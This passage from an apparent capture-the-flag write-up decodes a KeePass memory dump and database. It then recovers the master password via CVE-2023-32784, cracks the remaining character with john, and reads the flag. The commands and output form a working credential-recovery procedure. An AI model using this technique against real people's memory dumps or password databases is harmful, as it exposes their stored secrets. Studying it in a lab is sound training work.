$ base64 -d 539.dmp | xortool-xor -f - -s 'A' -n > 1337.dmp

$ file 1337.dmp
1337.dmp: Mini DuMP crash report, 18 streams, Tue Aug 29 02:29:23 2023, 0x461826 type
```

Now, we can also decode the `Database1337` file in the same way to retrieve the `Database1337.kdbx` file, with the only difference being that the `XOR` key used is `B` (`0x42`).

```console
$ base64 -d Database1337 | xortool-xor -f - -s 'B' -n > Database1337.kdbx

$ file Database1337.kdbx
Database1337.kdbx: Keepass password database 2.x KDBX
```

## Finding the Master Password

Our goal for this room seems to be accessing the `Database1337.kdbx` database, but we don't have the master password for it.

Looking into what we can do with the `KeePass` process memory dump, we came across `CVE-2023-32784`. Essentially, due to a vulnerability in the text box used for reading the password from the user, remnants of the entered master password gets left in memory. For example, if the user entered `password` as the master password, it is possible to find the strings `•a, ••s, •••s, ••••w, •••••o, ••••••r, •••••••d` in memory.

To search the memory for these strings, we can utilize the tool available [here](https://github.com/JorianWoltjer/keepass-dump-extractor).

Running it against the `1337.dmp` memory dump, it reveals most of the password, with only the first character missing.

```console
$ ./keepass-dump-extractor 1337.dmp -f gaps
●No[REDACTED]23
...
```

Since we don't know the first character, we can use `keepass-dump-extractor` again to generate all possible passwords and save them to a file.

```console
$ ./keepass-dump-extractor 1337.dmp -f all > all_possible_passwords.txt
```

Now, we can use `keepass2john` to generate a hash for the `KeePass` database.

```console
$ keepass2john Database1337.kdbx > keepass_hash
```

After that, we can use `john` to test the passwords in the wordlist we created against the hash to find the correct password.

```console
$ john keepass_hash --wordlist=all_possible_passwords.txt
...
[REDACTED]No[REDACTED]23 (Database1337)
...
```

## Opening the KeePass Database

With the correct master password in hand, we open the `Database1337.kdbx` and find the flag in the `Notes` section of the `You win!` entry.

```console
$ kpcli --kdb Database1337.kdbx
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> cd Database1337/
kpcli:/Database1337> ls
=== Groups ===
eMail/
General/
Homebanking/
Internet/
Network/
Windows/
=== Entries ===
0. Sample Entry                                               keepass.info
1. Sample Entry #2                          keepass.info/help/kb/testform.
2. You win!
kpcli:/Database1337> show -f 2

Title: You win!
Uname:
 Pass: xWjy8SqH2CDDw76ptmvP
  URL:
Notes: THM{[REDACTED]}
```

<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>